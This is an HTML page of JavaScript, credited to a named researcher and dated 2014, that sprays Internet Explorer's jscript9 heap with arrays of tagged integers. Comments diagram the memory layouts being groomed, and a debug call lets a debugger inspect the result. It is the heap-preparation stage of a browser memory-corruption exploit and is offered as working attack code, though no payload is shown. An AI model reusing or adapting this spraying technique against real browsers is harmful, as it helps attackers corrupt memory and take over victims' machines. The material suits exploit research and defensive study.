<!--
 Author: Chen Zhang (@demi6od) <demi6d@gmail.com>
 Date: 2014 May 23rd
-->

<html>
    <script>
        var gIsVar = true;
        function dword2Int(data) {
            if (gIsVar) {
                return data >> 1;
            } else {
                return data;
            }
        }

        /* Spray memory layout 
           -------------------------------
           | LargeHeapBlockEntry         |
           -------------------------------
           | ArrayDataHead               |
           -------------------------------
           | (number << 1) | 1 or number |
           | (number << 1) | 1 or number |
           | (number << 1) | 1 or number |
           | ...                         |
           | object pointer or number    |
           | object pointer or number    |
           | object pointer or number    |
           | ...                         |
           -------------------------------
        */ 
        function arrSpray() {
            var obj = {a: 1, b: 2, c: 3};

            var arrDataHeadLen = 0x10;
            var largeBlockLen = 0x10;
            var arrSize = 0x10000;
            var arrLen = (arrSize - arrDataHeadLen) / 4;

            heapArr = [];
            var arrNum = 0x1000;
            for (var i = 0; i < arrNum; i++) {
                heapArr[i] = new Array(arrLen);
                for (var j = 0; j < arrLen ; j += 0x40) {
                    heapArr[i][j + 0x0] = dword2Int(0x41410001);
                    heapArr[i][j + 0x1] = dword2Int(0x41410011);
                    heapArr[i][j + 0x2] = dword2Int(0x41410021);
                    heapArr[i][j + 0x3] = dword2Int(0x41410031);
                    heapArr[i][j + 0x4] = dword2Int(0x41410041);
                    heapArr[i][j + 0x5] = dword2Int(0x41410051);
                    heapArr[i][j + 0x6] = dword2Int(0x41410061);
                    heapArr[i][j + 0x7] = dword2Int(0x41410071);
                    heapArr[i][j + 0x8] = dword2Int(0x41410081);
                    heapArr[i][j + 0x9] = dword2Int(0x41410091);
                    heapArr[i][j + 0xa] = dword2Int(0x414100a1);
                    heapArr[i][j + 0xb] = dword2Int(0x414100b1);
                    heapArr[i][j + 0xc] = dword2Int(0x414100c1);
                    heapArr[i][j + 0xd] = dword2Int(0x414100d1);
                    heapArr[i][j + 0xe] = dword2Int(0x414100e1);
                    heapArr[i][j + 0xf] = dword2Int(0x414100f1);

                    heapArr[i][j + 0x10] = dword2Int(0x41410101);
                    heapArr[i][j + 0x11] = dword2Int(0x41410111);
                    heapArr[i][j + 0x12] = dword2Int(0x41410121);
                    heapArr[i][j + 0x13] = dword2Int(0x41410131);
                    heapArr[i][j + 0x14] = dword2Int(0x41410141);
                    heapArr[i][j + 0x15] = dword2Int(0x41410151);
                    heapArr[i][j + 0x16] = dword2Int(0x41410161);
                    heapArr[i][j + 0x17] = dword2Int(0x41410171);
                    heapArr[i][j + 0x18] = dword2Int(0x41410181);
                    heapArr[i][j + 0x19] = dword2Int(0x41410191);
                    heapArr[i][j + 0x1a] = dword2Int(0x414101a1);
                    heapArr[i][j + 0x1b] = dword2Int(0x414101b1);
                    heapArr[i][j + 0x1c] = dword2Int(0x414101c1);
                    heapArr[i][j + 0x1d] = dword2Int(0x414101d1);
                    heapArr[i][j + 0x1e] = dword2Int(0x414101e1);
                    heapArr[i][j + 0x1f] = dword2Int(0x414101f1);

                    heapArr[i][j + 0x20] = dword2Int(0x41410201);
                    heapArr[i][j + 0x21] = dword2Int(0x41410211);
                    heapArr[i][j + 0x22] = dword2Int(0x41410221);
                    heapArr[i][j + 0x23] = dword2Int(0x41410231);
                    heapArr[i][j + 0x24] = dword2Int(0x41410241);
                    heapArr[i][j + 0x25] = dword2Int(0x41410251);
                    heapArr[i][j + 0x26] = dword2Int(0x41410261);
                    heapArr[i][j + 0x27] = dword2Int(0x41410271);
                    heapArr[i][j + 0x28] = dword2Int(0x41410281);
                    heapArr[i][j + 0x29] = dword2Int(0x41410291);
                    heapArr[i][j + 0x2a] = dword2Int(0x414102a1);
                    heapArr[i][j + 0x2b] = dword2Int(0x414102b1);
                    heapArr[i][j + 0x2c] = dword2Int(0x414102c1);
                    heapArr[i][j + 0x2d] = dword2Int(0x414102d1);
                    heapArr[i][j + 0x2e] = dword2Int(0x414102e1);
                    heapArr[i][j + 0x2f] = dword2Int(0x414102f1);

                    heapArr[i][j + 0x30] = dword2Int(0x41410301);
                    heapArr[i][j + 0x31] = dword2Int(0x41410311);
                    heapArr[i][j + 0x32] = dword2Int(0x41410321);
                    heapArr[i][j + 0x33] = dword2Int(0x41410331);
                    heapArr[i][j + 0x34] = dword2Int(0x41410341);
                    heapArr[i][j + 0x35] = dword2Int(0x41410351);
                    heapArr[i][j + 0x36] = dword2Int(0x41410361);
                    heapArr[i][j + 0x37] = dword2Int(0x41410371);

                    if ((j + 0x38) != arrLen) {
                        heapArr[i][j + 0x38] = dword2Int(0x41410381);
                        heapArr[i][j + 0x39] = dword2Int(0x41410391);
                        heapArr[i][j + 0x3a] = dword2Int(0x414103a1);
                        heapArr[i][j + 0x3b] = dword2Int(0x414103b1);
                        heapArr[i][j + 0x3c] = dword2Int(0x414103c1);
                        heapArr[i][j + 0x3d] = dword2Int(0x414103d1);
                        heapArr[i][j + 0x3e] = dword2Int(0x414103e1);
                        heapArr[i][j + 0x3f] = dword2Int(0x414103f1);
                    }
                }

                // Set array start and end tag
                heapArr[i][0] = dword2Int(0x0eadc0df);
                heapArr[i][arrLen - 1] = dword2Int(0x0eadc0df);

                if (gIsVar) {
                    // Change intArray into varArray (jscript9!Js::JavascriptNativeIntArray::ToVarArray)
                    heapArr[i][0x100] = obj;
                }
            }
        }

        /* Spray memory layout 
           ------------------------
           |  ArrayDataHead       |
           ------------------------
           |  number              |
           |  number              |
           |  number              |
           |  ...                 |
           ------------------------
        */ 
        function smallHeadIntArrSpray() {
            heapArr = [];
            var arrNum = 0x100;
            for (var i = 0; i < arrNum; i++ ) {
                // size = 0x2f0 = 0xbc * 4 = 0x300 - 0x10(ArrDataHeadLen)
                heapArr[i] = [
                    0x00adc0df, 0x44444444, 0x44444444, 0x44444444,
                    0x44444444, 0x44444444, 0x44444444, 0x44444444,
                    0x44444444, 0x44444444, 0x44444444, 0x44444444,
                    0x44444444, 0x44444444, 0x44444444, 0x44444444,

                    0x44444444, 0x44444444, 0x44444444, 0x44444444,
                    0x44444444, 0x44444444, 0x44444444, 0x44444444,
                    0x44444444, 0x44444444, 0x44444444, 0x44444444,
                    0x44444444, 0x44444444, 0x44444444, 0x44444444,

                    0x44444444, 0x44444444, 0x44444444, 0x44444444,
                    0x44444444, 0x44444444, 0x44444444, 0x44444444,
                    0x44444444, 0x44444444, 0x44444444, 0x44444444,
                    0x44444444, 0x44444444, 0x44444444, 0x44444444,

                    0x44444444, 0x44444444, 0x44444444, 0x44444444,
                    0x44444444, 0x44444444, 0x44444444, 0x44444444,
                    0x44444444, 0x44444444, 0x44444444, 0x44444444,
                    0x44444444, 0x44444444, 0x44444444, 0x44444444,    

                    0x44444444, 0x44444444, 0x44444444, 0x44444444,
                    0x44444444, 0x44444444, 0x44444444, 0x44444444,
                    0x44444444, 0x44444444, 0x44444444, 0x44444444,
                    0x44444444, 0x44444444, 0x44444444, 0x44444444,

                    0x44444444, 0x44444444, 0x44444444, 0x44444444,
                    0x44444444, 0x44444444, 0x44444444, 0x44444444,
                    0x44444444, 0x44444444, 0x44444444, 0x44444444,
                    0x44444444, 0x44444444, 0x44444444, 0x44444444,

                    0x44444444, 0x44444444, 0x44444444, 0x44444444,
                    0x44444444, 0x44444444, 0x44444444, 0x44444444,
                    0x44444444, 0x44444444, 0x44444444, 0x44444444,
                    0x44444444, 0x44444444, 0x44444444, 0x44444444,

                    0x44444444, 0x44444444, 0x44444444, 0x44444444,
                    0x44444444, 0x44444444, 0x44444444, 0x44444444,
                    0x44444444, 0x44444444, 0x44444444, 0x44444444,
                    0x44444444, 0x44444444, 0x44444444, 0x44444444,       

                    0x44444444, 0x44444444, 0x44444444, 0x44444444,
                    0x44444444, 0x44444444, 0x44444444, 0x44444444,
                    0x44444444, 0x44444444, 0x44444444, 0x44444444,
                    0x44444444, 0x44444444, 0x44444444, 0x44444444,

                    0x44444444, 0x44444444, 0x44444444, 0x44444444,
                    0x44444444, 0x44444444, 0x44444444, 0x44444444,
                    0x44444444, 0x44444444, 0x44444444, 0x44444444,
                    0x44444444, 0x44444444, 0x44444444, 0x44444444,

                    0x44444444, 0x44444444, 0x44444444, 0x44444444,
                    0x44444444, 0x44444444, 0x44444444, 0x44444444,
                    0x44444444, 0x44444444, 0x44444444, 0x44444444,
                    0x44444444, 0x44444444, 0x44444444, 0x44444444,

                    0x44444444, 0x44444444, 0x44444444, 0x44444444,
                    0x44444444, 0x44444444, 0x44444444, 0x44444444,
                    0x44444444, 0x44444444, 0x44444444, 0x00adc0df,   
                ];    
            }
        }

        /* Spray memory layout 
           -----------------------------
           |  JavascriptNativeIntArray |
           |                           |
                         ---------------
           |             |ArrayDataHead|
           -----------------------------
           |ArrayDataHead|             |
           ---------------
           |  number                   |
           |  number                   |
           |  number                   |
           |  ...                      |
                         ---------------
           |  number     |  padding    |
           -----------------------------
        */ 
        function adjacentIntArrSpray() {
            heapArr = [];
            var arrNum = 0x100;
            for (var i = 0; i < arrNum; i++ ) {
                // size = 0xc0 = 0x30 * 4 = 0x100 - 0x28(intArrayLen) - 0x10(arrDataHeadLen) - 0x8(padding)
                heapArr[i] = [
                    0x00adc0df, 0x44444444, 0x44444444, 0x44444444,
                    0x44444444, 0x44444444, 0x44444444, 0x44444444,
                    0x44444444, 0x44444444, 0x44444444, 0x44444444,
                    0x44444444, 0x44444444, 0x44444444, 0x44444444,

                    0x44444444, 0x44444444, 0x44444444, 0x44444444,
                    0x44444444, 0x44444444, 0x44444444, 0x44444444,
                    0x44444444, 0x44444444, 0x44444444, 0x44444444,
                    0x44444444, 0x44444444, 0x44444444, 0x44444444,

                    0x44444444, 0x44444444, 0x44444444, 0x44444444,
                    0x44444444, 0x44444444, 0x44444444, 0x44444444,
                    0x44444444, 0x44444444, 0x44444444, 0x44444444,
                    0x44444444, 0x44444444, 0x44444444, 0x00adc0df,   
                ];    
            }
        }

        //smallHeadIntArrSpray();
        //adjacentIntArrSpray();
        arrSpray();

        Math.atan2(0xbabe, "[*] For debug....");
    </script>
</html>
